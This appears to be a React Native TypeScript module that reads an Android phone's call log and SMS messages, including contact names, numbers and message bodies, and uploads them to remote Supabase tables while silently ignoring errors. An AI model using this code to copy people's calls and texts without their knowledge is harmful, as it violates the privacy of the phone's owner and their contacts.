import { Platform } from 'react-native';
import { supabase } from './supabase';

let CallLog: any = null;
let SmsAndroid: any = null;

try {
  // These modules require prebuild and native linking
  // Optional loading: if not installed, features will be disabled gracefully
  // eslint-disable-next-line @typescript-eslint/no-var-requires
  CallLog = require('react-native-call-log');
} catch {}

try {
  // eslint-disable-next-line @typescript-eslint/no-var-requires
  SmsAndroid = require('react-native-get-sms-android');
} catch {}

export async function startTelephonySync(deviceId: string) {
  if (Platform.OS !== 'android') return;
  if (!deviceId) return;
  // Calls sync
  if (CallLog && CallLog.loadAll) {
    try {
      const calls = await CallLog.loadAll();
      for (const c of calls.slice(0, 50)) {
        await supabase.from('calls').insert({
          device_id: deviceId,
          type: c.type === 'OUTGOING' ? 'outgoing' : c.type === 'INCOMING' ? 'incoming' : 'missed',
          contact_name: c.name || null,
          number: c.phoneNumber || null,
          time: new Date(c.timestamp).toISOString(),
          duration_seconds: Number(c.duration) || 0,
        });
      }
    } catch {}
  }
  // SMS sync
  if (SmsAndroid && SmsAndroid.list) {
    try {
      SmsAndroid.list(JSON.stringify({ maxCount: 100 }), async (fail: any) => {}, async (count: number, smsList: any[]) => {
        for (const s of smsList) {
          await supabase.from('sms').insert({
            device_id: deviceId,
            contact_name: s.address || null,
            number: s.address || null,
            message: s.body || '',
            time: new Date(s.date).toISOString(),
            unread: s.read === 0,
          });
        }
      });
    } catch {}
  }
}

